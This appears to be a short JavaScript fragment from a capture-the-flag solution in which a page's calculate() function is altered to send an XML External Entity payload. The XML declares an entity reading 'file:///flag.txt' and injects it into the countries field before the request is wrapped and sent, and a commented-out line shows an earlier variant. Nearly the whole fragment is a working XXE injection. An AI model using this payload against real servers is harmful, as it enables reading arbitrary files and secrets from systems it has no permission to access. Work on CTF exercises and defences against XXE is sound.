...
function encrypted(body) {
    console.log("!!!ENC" + JSON.stringify(body));
...
function calculate() {
  ...
  //countries = "<!ENTITY anyfile SYSTEM \“file:///flag.txt\”>";
  xml = `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><data><countries>&xxe;</countries><enddate>${endDate}</enddate><resttype>${restType}</resttype><startdate>${startDate}</startdate></data>`
  let data = JSON.stringify(encrypted({format: 'xml', data: xml}));
